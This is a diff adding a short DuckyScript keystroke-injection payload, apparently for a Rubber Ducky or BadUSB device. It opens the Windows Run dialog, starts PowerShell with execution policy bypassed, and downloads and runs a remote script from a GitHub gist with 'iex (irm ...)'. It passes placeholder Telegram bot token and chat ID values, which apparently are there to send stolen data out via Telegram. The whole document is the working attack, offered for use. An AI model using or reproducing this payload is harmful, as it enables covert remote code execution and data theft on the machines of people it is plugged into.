@@ -1,0 +1,8 @@
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -Ep Bypass -C $hide='y'
+ENTER
+DELAY 1000
+STRING powershell -Ep Bypass -C $hide='y';$tg='TGBotToken';$ChatID='Your telegram ID';iex (irm https://gist.githubusercontent.com/NotA0ua/91e54da6e81b97e77df219d2c8a28d50/raw/887435f4ab3a6dcead0cf64056a121b68d1695fb/main.ps1)
+ENTER 
